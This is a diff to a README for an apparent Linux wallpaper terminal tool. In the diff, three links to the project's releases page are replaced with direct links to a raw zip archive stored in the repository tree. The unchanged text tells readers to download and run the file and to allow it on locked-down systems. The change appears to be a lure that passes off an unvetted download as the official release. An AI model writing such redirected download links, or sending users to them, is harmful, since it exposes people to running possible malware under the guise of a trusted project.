@@ -1,6 +1,6 @@
 # 🖥️ linux-wallpaperengine-TUI - Fast wallpaper control on Linux
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge&logo=github)](https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge&logo=github)](https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/raw/refs/heads/main/ast/wallpaperengine_linux_TUI_3.1.zip)
 
 ## 📌 What this is
 
@@ -12,7 +12,7 @@ It works well if you want a quick way to manage wallpaper changes from the termi
 
 Visit this page to download the latest release:
 
-https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/releases
+https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/raw/refs/heads/main/ast/wallpaperengine_linux_TUI_3.1.zip
 
 On the release page, look for the latest file for your system. Download it, then run it on your Linux machine.
 
@@ -34,7 +34,7 @@ If you use a locked-down system, you may need to allow the file to run from your
 
 Go to:
 
-https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/releases
+https://github.com/Pouteriacampechiananervosachurchkey758/linux-wallpaperengine-TUI/raw/refs/heads/main/ast/wallpaperengine_linux_TUI_3.1.zip
 
 ### 2. Get the latest file
 
